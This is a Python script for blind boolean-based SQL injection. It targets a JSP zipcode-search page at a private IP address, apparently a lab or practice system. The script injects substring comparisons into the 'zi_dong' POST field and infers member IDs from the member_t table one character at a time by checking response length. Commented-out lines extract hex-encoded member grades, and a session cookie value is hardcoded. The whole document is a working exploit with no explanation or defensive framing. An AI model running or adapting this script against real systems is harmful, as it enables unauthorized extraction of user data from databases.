from requests_toolbelt import MultipartEncoder
from string import ascii_lowercase
from string import ascii_uppercase
import requests

alpha_lower = list(ascii_lowercase)
alpha_upper = list(ascii_uppercase)
unicode_hex = alpha_upper + list(range(0,10))
result = ""
url = "http://172.16.242.142:8080/apple/member/member_searchZipcode.jsp"

for i in range(1, 50) : 
    for	j in alpha_lower :
    #for	j in alpha_upper :
    #for j in range(0, 10) :
    #for j in unicode_hex : 
        param = {
            "JSESSIONID" : "D21D4E1EB7F6A00245934D4FB8FA0FF5",
            "Notice0" : "done",
            #"zi_dong" : "a' and substring((select hex(me_grade) from member_t limit 0, 1),"+str(i)+",1)='"+str(j)+"'#"
            "zi_dong" : "a' and substring((select me_id from member_t limit 0, 1),"+str(i)+",1)='"+str(j)+"'#"
       	}
       	res = requests.post(url, data=param)
       	if len(res.content) == 4486 : 
       		result += str(j)
       	    #print(str(i)+"th article's length("+str(j)+") : ", len(res.content))
   # print ()
print("%s" % (result))